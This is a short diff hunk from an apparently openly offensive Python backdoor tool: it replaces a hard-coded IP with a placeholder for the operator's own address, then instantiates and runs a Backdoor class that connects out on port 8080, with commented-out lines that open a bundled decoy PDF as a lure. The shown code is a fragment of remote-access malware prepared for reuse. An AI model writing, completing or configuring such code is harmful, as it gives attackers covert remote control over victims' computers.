@@ -70,7 +70,7 @@ class Backdoor:
 #file_name = sys._MEIPASS + "\sample.pdf"
 #subprocess.Popen(file_name, shell=True)
 try:
-    my_backdoor = Backdoor("192.168.43.182", 8080)
+    my_backdoor = Backdoor("**ENTER THE IP ADDRESS OF YOUR DEVICE**", 8080)
     my_backdoor.run()
 except Exception:
     sys.exit()
